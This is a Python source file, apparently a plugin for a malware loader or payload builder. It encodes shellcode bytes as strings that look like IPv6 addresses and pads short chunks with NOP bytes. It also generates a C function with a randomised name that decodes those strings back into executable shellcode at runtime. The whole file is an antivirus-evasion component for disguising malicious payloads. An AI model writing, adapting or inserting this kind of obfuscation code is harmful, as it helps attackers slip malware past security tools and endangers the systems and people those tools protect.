import random
import string

class IPv6Obfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(':'.join([ f'{chunk[n]:02x}{chunk[n+1]:02x}' for n in range(0, 16, 2)]))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
unsigned char * {self.name}(const unsigned char *encoded[])
{{
    int size = {self.size};
    unsigned char *out = malloc(size*16);
    int converted;
    for (int i=0; i<size; i++){{
        char *mutable = strdup(encoded[i]);
        char *myPtr = strtok(mutable, ":");
        for (int j=0; j<8; j++){{
            converted = strtol(myPtr, NULL, 16);
            out[i*16+j*2] = converted >> 8 & 255;
            out[i*16+j*2 + 1] = converted & 255;
            myPtr = strtok(NULL, ":");
        }}
    }}

    return out;
}}
"""